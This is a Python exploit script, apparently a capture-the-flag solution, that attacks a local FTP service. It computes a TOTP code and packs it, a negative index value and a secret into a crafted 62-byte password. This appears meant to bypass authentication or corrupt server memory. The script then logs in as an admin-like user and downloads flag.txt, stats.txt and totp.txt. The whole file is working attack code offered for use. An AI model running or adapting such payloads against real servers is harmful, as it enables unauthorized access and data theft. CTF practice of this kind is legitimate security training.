#!/usr/bin/env python3
import base64
import ftplib
import hashlib
import hmac
import io
import struct
import time

SECRET = b"AAAAAAAAAAAAAAAA"
IDX = -6940


def otp():
    d = hmac.new(
        base64.b32decode(SECRET), struct.pack(">Q", int(time.time() // 30)), hashlib.sha1
    ).digest()
    o = d[-1] & 15
    return f"{(int.from_bytes(d[o : o + 4], 'big') & 0x7FFFFFFF) % 1000000:06d}".encode()


def password():
    p = bytearray(b"P" * 62)
    p[:6] = otp()
    p[6] = ord("X")
    p[7:9] = struct.pack("<h", IDX)
    p[46:62] = SECRET
    return bytes(p).decode("latin-1")


def enroll():
    f = ftplib.FTP()
    f.encoding = "latin-1"
    try:
        f.connect("127.0.0.1", 30029, timeout=10)
        print("ENROLL", f.sendcmd("USER admim"), f.sendcmd("PASS enroll"), flush=True)
    except Exception as exc:
        print("ENROLL_ERR", repr(exc), flush=True)
    finally:
        try:
            f.close()
        except Exception:
            pass


def main():
    enroll()
    f = ftplib.FTP()
    f.encoding = "latin-1"
    try:
        f.connect("127.0.0.1", 30029, timeout=15)
        print("USER", f.sendcmd("USER admim"), flush=True)
        print("PASS", f.sendcmd("PASS " + password()), flush=True)
        print("PWD", f.pwd(), flush=True)
        try:
            print("NLST", f.nlst(), flush=True)
        except Exception as exc:
            print("NLST_ERR", repr(exc), flush=True)
        for name in ("flag.txt", "stats.txt", "totp.txt"):
            try:
                buf = io.BytesIO()
                f.retrbinary("RETR " + name, buf.write)
                data = buf.getvalue()
                print("FILE", name, len(data), repr(data), flush=True)
                if b"avito{" in data:
                    print("EXACT_FLAG", data.decode("utf-8", "replace"), flush=True)
            except Exception as exc:
                print("FILE_ERR", name, repr(exc), flush=True)
    except Exception as exc:
        print("LOGIN_ERR", repr(exc), flush=True)
    finally:
        try:
            f.close()
        except Exception:
            pass
    print("FLAG_DONE", flush=True)


if __name__ == "__main__":
    main()
